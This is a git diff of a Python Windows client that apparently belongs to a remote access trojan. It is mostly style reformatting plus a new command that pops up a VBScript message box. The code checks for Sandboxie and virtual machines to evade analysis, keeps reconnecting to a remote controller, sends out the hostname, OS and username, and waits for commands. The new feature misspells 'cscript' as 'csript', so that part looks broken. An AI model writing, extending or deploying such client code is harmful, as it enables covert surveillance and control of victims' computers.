@@ -1,9 +1,20 @@
 # need install python packages before running code
 # python -m pip install pywin32 pyscreeze
 
-import socket, os, sys, platform, time, ctypes, subprocess, threading, wmi
+import socket
+import os
+import sys
+import platform
+import time
+import ctypes
+import subprocess
+import threading
+import wmi
 
-import win32api, winerror, win32event, win32crypt
+import win32api
+import winerror
+import win32event
+import win32crypt
 
 from winreg import *
 
@@ -28,7 +39,9 @@ def detectSandboxie():
 
         return " (Sandboxie) "
 
-    except: return ""
+    except:
+        return ""
+
 
 def detectVM():
     objWMI = wmi.WMI()
@@ -36,6 +49,7 @@ def detectVM():
         if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
             return " (Virtual Machine) "
     return ""
+
 
 def server_connect():
     global obj_socket
@@ -46,20 +60,36 @@ def server_connect():
             obj_socket.connect((strHost, intPort))
 
         except socket.error:
-            time.sleep(5)  #after 5 second will try again
+            time.sleep(5)  # after 5 second will try again
 
-        else: break
+        else:
+            break
 
-    str_user_info = socket.gethostname() + "'," + platform.system() + "  " + platform.release() + detectSandboxie() + detectVM() + "', " + os.environ["USERNAME"]
+    str_user_info = socket.gethostname() + "'," + platform.system() + "  " + \
+        platform.release() + detectSandboxie() + detectVM() + \
+        "', " + os.environ["USERNAME"]
     send(str.encode(str_user_info))
 
-decode_utf8 = lambda data: data.decode("utf-8")
 
-recv = lambda buffer: obj_socket.recv(buffer)
+def decode_utf8(data): return data.decode("utf-8")
 
-send = lambda data: obj_socket.send(data)
+
+def recv(buffer): return obj_socket.recv(buffer)
+
+
+def send(data): return obj_socket.send(data)
+
 
 server_connect()
+
+
+def messageBox(msg):
+    objVBS = open(TMP + "/m.vbs", "w")
+    objVBS.write("MsgBox " + msg + " Message")
+    objVBS.close()
+
+    subprocess.Popen(["csript", TMP + "/m.vbs"], shell=True)
+
 
 while True:
     try:
@@ -70,6 +100,9 @@ while True:
             if str_data == "exit":
                 obj_socket.close()
                 sys.exit(0)
+
+            elif str_data[:3] == "msg":
+                messageBox(str_data[4:])
 
     except socket.error:
         obj_socket.close()
